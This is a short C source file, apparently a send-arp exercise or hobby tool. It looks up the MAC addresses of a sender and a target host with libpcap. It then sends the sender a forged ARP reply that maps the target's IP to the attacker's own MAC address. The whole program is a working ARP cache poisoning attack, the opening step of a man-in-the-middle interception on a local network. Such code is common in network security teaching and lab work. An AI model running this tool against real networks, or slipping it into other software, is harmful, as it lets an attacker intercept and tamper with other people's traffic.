#include "ty_network.h"

int main(int argc, char* argv[]) {
	my_assert(argc == 4, "syntax: ./%s <interface> <send ip> <target ip>\n", argv[0]);

	const char *interface = argv[1];


	struct in_addr 		attack_ip, sender_ip, target_ip;
	struct ether_addr 	attack_ha, sender_ha, target_ha;

	printf("- Interface: %s\n",interface);
	my_assert( inet_pton(AF_INET, argv[2], &sender_ip) > 0, "Invalid sender_ip Or Error On Copying IP");
	my_assert( inet_pton(AF_INET, argv[3], &target_ip) > 0, "Invalid target_ip Or Error On Copying IP");

	my_assert( GetLocalIP(&attack_ip, interface), "Error On Getting Local IP Address\n");
	printf("- Local_IP: %s\n", inet_ntoa(attack_ip));
	my_assert( GetLocalHA(&attack_ha, interface), "Error On Getting Local Hardware Address\n");
	printf("- Local_HA: %s\n", usr_ether_ntoa(&attack_ha));

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle;
	my_assert( (handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf)) != NULL, "couldn't open device %s: %s\n", argv[1], errbuf);


	printf("- Sender_IP: %s\n",inet_ntoa(sender_ip));
	my_assert( GetHA(handle, &attack_ha, &attack_ip, &sender_ha, &sender_ip), "Error On Getting sender(%s) Hardware Address\n", argv[2]);
	printf("- Sender_HA: %s\n",usr_ether_ntoa(&sender_ha));

	printf("- Target_IP: %s\n",inet_ntoa(target_ip));
	my_assert( GetHA(handle, &attack_ha, &attack_ip, &target_ha, &target_ip), "Error On Getting target(%s) Hardware Address\n", argv[3]);
	printf("- Taeget_HA: %s\n",usr_ether_ntoa(&target_ha));


	unsigned char *packet = (unsigned char *)malloc(ETHER_MAX_LEN);
	size_t tot_len = 0, len;
	my_assert( (len = GenEtherPacket(packet, &sender_ha, &attack_ha, ETHERTYPE_ARP)) >= 0, "Error on Generate Ether Packet!\n"); tot_len += len;
	my_assert( (len = GenARPPacket(packet+tot_len, ARPOP_REPLY, &attack_ha, &target_ip, &sender_ha, &sender_ip)) >= 0, "Error on Generate ARP Packet\n"); tot_len += len;

	my_assert( pcap_sendpacket(handle, packet, tot_len) == 0, "Error sending the packet: %s\n", pcap_geterr(handle));
	free(packet);


	return 0;
}
